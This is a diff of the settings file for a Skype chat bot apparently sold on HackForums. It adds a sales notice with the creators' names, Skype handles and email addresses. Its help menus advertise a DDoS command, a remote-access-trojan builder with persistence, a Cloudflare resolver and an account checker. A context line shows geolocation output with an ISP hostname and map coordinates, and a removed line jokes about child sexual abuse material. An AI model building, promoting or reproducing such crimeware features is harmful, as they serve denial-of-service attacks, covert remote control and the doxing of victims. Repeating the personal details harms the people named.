@@ -4370,6 +4370,22 @@ ZW,10,"Harare"</Value>
     <Setting Name="whitelistlist" Type="System.String" Scope="User">
       <Value Profile="(Default)">%everybody%</Value>
     </Setting>
+    <Setting Name="buy" Type="System.String" Scope="User">
+      <Value Profile="(Default)">----------------------------------------------------------------
+AutoBuy: http://skypebot.ga/Page.html
+HF Thread: http://www.hackforums.net/showthread.php?tid=4581588
+Creators skype: les.de OR lesleydk@hotmail.com to find me better
+Creators email: lesleydk.ldk@gmail.com
+
+Some credits:
+-Lesley (creator, administrating, support, apis, everything :p)
+-Damjan (advertising &amp; administrating &amp; helping users &amp; most ideas)
+-WSZ (Applying theme to the bot and some other stuff)
+-ScreemS (Advertising, He had a great idea)
+-Royal Bash (GFX, thanks &lt;3 )
+-Soufian (Some APIS)
+--------------------------------------------------------------</Value>
+    </Setting>
     <Setting Name="cmnprobs" Type="System.String" Scope="User">
       <Value Profile="(Default)">1. Update failed &gt; Open as admin
 
@@ -4394,10 +4410,13 @@ DNS: 6978-20-135-138.access.telenet.be
 Google Maps: https://maps.google.com/?ll=51.,4.266</Value>
     </Setting>
     <Setting Name="admins" Type="System.String" Scope="User">
-      <Value Profile="(Default)">jeteroll83</Value>
+      <Value Profile="(Default)" />
     </Setting>
     <Setting Name="joketemp" Type="System.String" Scope="User">
       <Value Profile="(Default)">&lt;font face="Verdana" size="2"&gt;</Value>
+    </Setting>
+    <Setting Name="whitelist" Type="System.String" Scope="User">
+      <Value Profile="(Default)">les.de</Value>
     </Setting>
     <Setting Name="Premium" Type="System.String" Scope="User">
       <Value Profile="(Default)" />
@@ -4410,6 +4429,9 @@ Google Maps: https://maps.google.com/?ll=51.,4.266</Value>
     </Setting>
     <Setting Name="prf" Type="System.String" Scope="User">
       <Value Profile="(Default)">{"":"</Value>
+    </Setting>
+    <Setting Name="cht" Type="System.String" Scope="User">
+      <Value Profile="(Default)">skype:?chat&amp;blob=QXuTwv-m26GS6GVvxGkI1XjNvEfboCrtlkJ1qWSBtglBZLj4T0-fyQCFv8o0FPFgrsLohg</Value>
     </Setting>
     <Setting Name="adminhlp" Type="System.String" Scope="User">
       <Value Profile="(Default)">----------ADMIN PANEL----------
@@ -4559,33 +4581,17 @@ For ex: !rat build -name=Legit%20Program -persistance
 ----------------------------RAT OPT.----------------------------
 </Value>
     </Setting>
-    <Setting Name="buy" Type="System.String" Scope="User">
-      <Value Profile="(Default)">----------------------------------------------------------------
-Buying is unavaiable at this time.
-----------------------------------------------------------------</Value>
-    </Setting>
-    <Setting Name="whitelist" Type="System.String" Scope="User">
-      <Value Profile="(Default)">jeteroll83</Value>
-    </Setting>
-    <Setting Name="cht" Type="System.String" Scope="User">
-      <Value Profile="(Default)">skype:?chat&amp;blob=cOlS8bM7CwKlTpJeX8vluIprhzExnXURXz_Vejlg_ezpLTPs7yym1KURf8U5-ti5A-XnJ64lQjaa-7HT7LAvVxTsaGr7kv681HTzde2Su5xtc_6vCKXZpQ-ewzdMuT8wppH17WkowV20HSJ-QjzbtFjetDTPpmrrS06fafqdB9UPWQJmiEcQkcIXSnRpC4IUunC-yvka28sTWz3f2GPHY-cSrME_6O0AXG8</Value>
-    </Setting>
     <Setting Name="helpmsg" Type="System.String" Scope="User">
       <Value Profile="(Default)">----------------------------HELP MENU----------------------------
 !8ball &lt;question&gt; -- Answers a yes/no question
-!buy -- Buy premium
+!buy -- Buy the bot program/bot source (vb.net)
 !calc &lt;help/expression&gt; -- Just do !calc help
 !cfresolve &lt;site&gt; -- Resolves clouflare
 !check &lt;help/arguments&gt; -- Check accounts
-!copypasta -- Pastes some dank pasta
-!cp -- Gives you some good CP ;)
 !crawl &lt;page&gt; -- Gives all links of a webpage (crawls a site)
 !currency &lt;from&gt; &lt;to&gt; &lt;amount&gt; -- Converts currency
-!weather &lt;city/country&gt; -- Gives the weather of a city/country
-!darkness -- Says the lyrics to The Sound of Silence
 !ddos &lt;ip&gt; &lt;port&gt; &lt;time&gt; -- Ddosses the ip
 !deadfly &lt;adfly uri or similar&gt; -- unshortens adfly and similar
-!deez nuts -- HA GOTTI
 !dice/!rtd -- Rolls the dice and says something :D
 !dict &lt;word&gt; -- Defines the word given
 !dns &lt;site&gt; -- Gets all dns records of a site
